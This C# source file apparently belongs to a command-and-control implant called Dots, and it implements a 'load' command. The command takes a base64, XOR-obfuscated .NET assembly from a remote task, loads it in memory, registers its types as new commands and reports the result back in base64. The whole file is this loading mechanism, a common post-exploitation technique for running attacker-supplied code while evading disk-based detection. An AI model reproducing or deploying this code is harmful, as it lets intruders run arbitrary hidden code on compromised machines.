using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Reflection;
using System.Text;
using Dots.Models;

namespace Dots.Commands
{
    public class LoadCommand : DotsCommand
    {
        public override string Name => "load";
        public override DotsProperties DotsProperty { get; set; }

        public override string Execute(TaskRequest task)
        {           
            Assembly assembly = Assembly.Load(Zor(Convert.FromBase64String(task.Params[0]), task.Params[1]));

            List<string> loaded = new List<string>();
            List<string> failed = new List<string>();

            foreach (Type type in assembly.GetExportedTypes())
            {
                string full_name = type.Name;
                try
                {
                    object command = Activator.CreateInstance(type);
                    PropertyInfo dotsProperty = type.GetProperty("DotsProperty");
                    dotsProperty.SetValue(command, DotsProperty);
                    DotsProperty.Commands.Add(command);
                    loaded.Add(full_name);
                } catch {
                    failed.Add(full_name);
                }
            }
            if (failed.Count > 0)
            {
                DotsProperty.TaskManager.SendError(-32000, Convert.ToBase64String(Encoding.UTF8.GetBytes($"Failed to load {string.Join(", ", failed)}")), task.Id);
            }
            if (loaded.Count > 0)
            {
                DotsProperty.TaskManager.SendResult(Convert.ToBase64String(Encoding.UTF8.GetBytes($"Succesfully loaded {string.Join(", ", loaded)}")), task.Id);
            }
            return "";
        }
    }
}
